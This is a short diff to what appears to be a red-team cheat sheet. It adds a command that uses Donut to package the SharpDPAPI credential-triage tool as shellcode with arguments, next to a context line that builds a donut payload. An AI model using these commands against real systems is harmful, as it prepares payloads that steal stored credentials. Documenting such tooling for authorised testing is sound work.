@@ -316,6 +316,12 @@ $ make debug
 $ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 ```
 
+### Execution with Option on Target
+
+```c
+C:\> donut.exe -f 1 -p "triage /rpc" -i SharpDPAPI.exe
+```
+
 ## Freeze
 
 > https://github.com/Tylous/Freeze
